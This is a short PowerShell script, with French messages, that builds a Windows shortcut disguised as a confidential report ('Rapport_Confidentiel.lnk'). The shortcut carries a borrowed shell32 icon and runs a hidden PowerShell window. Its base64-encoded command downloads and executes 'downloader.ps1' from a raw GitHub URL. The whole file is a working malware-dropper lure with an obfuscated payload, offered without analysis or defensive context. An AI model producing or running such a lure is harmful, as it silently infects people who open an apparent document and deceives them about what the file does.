
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$PWD\Rapport_Confidentiel.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-nop -w hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGkAawBoAG8AdQBkAGkAZQBuAGcALwBzAGUAYwB1AHIAaQB0AHkALQBjAGUAcgB0AHMALQB1AHAAZABhAHQAZQBzAC8AbQBhAGkAbgAvAGQAbwB3AG4AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = "shell32.dll,3"
$Shortcut.Save()
Write-Host "[OK] Raccourci cree : Rapport_Confidentiel.lnk" -ForegroundColor Green
